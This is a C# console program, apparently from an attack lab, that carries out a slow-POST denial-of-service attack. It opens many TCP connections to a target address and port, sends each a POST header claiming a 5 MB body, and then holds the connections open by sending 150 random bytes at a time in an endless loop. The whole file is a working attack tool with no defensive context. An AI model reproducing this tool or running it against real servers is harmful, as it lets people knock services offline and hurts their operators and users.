using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using static System.Environment;

namespace AttackLab
{
	class Program
	{
		static int success = 0;
		static int error = 0;

		static void Main(string[] args)
		{
			if (args.Length < 2)
			{
				Console.WriteLine("Not enough arguments provided");
				return;
			}

			IPAddress address;
			int port, connections;
			ParseArgs(args, out address, out port, out connections);
			List<Socket> sockets = ConnectSockets(address, port, connections);
			SlowLoop(sockets);
		}

		private static List<Socket> ConnectSockets(IPAddress address, int port, int connections)
		{
			List<Socket> sockets = new List<Socket>();

			var endpoint = new IPEndPoint(address, port);

			Console.Write($"Connected: {success}\r\nRefused: {error}");
			for (int i = 0; i < connections; i++)
			{
				var socket = new Socket(SocketType.Stream, ProtocolType.Tcp);
				try
				{
					socket.Connect(endpoint);

					var header = @"POST / HTTP/1.1" + NewLine +
								"Host: " + "localhost" + NewLine +
								"Content-Length: 5000000" + NewLine +
								NewLine + "dfa";

					socket.Send(Encoding.Default.GetBytes(header));
					sockets.Add(socket);
					success++;
				}
				catch
				{
					error++;
				}
				UpdateStatus();
			}

			return sockets;
		}

		private static void ParseArgs(string[] args, out IPAddress address, out int port, out int connections)
		{
			IPAddress.TryParse(args[0], out address);
			int.TryParse(args[1], out port);
			int.TryParse(args[2], out connections);
		}

		private static void UpdateStatus()
		{
			Console.SetCursorPosition(0, Console.CursorTop - 1);
			Console.Write($"Connected: {success}\r\nRefused: {error}");
		}

		private static void SlowLoop(List<Socket> sockets)
		{
			var random = new Random();
			while (true)
			{
				List<Socket> lostConnection = new List<Socket>();
				foreach (var socket in sockets)
				{
					var buffer = new byte[150];
					random.NextBytes(buffer);
					try
					{
						socket.Send(buffer);
					}
					catch
					{
						error++;
						success--;
						UpdateStatus();
						lostConnection.Add(socket);
					}
				}
				sockets.RemoveAll(s => lostConnection.Contains(s));
			}
		}
	}
}
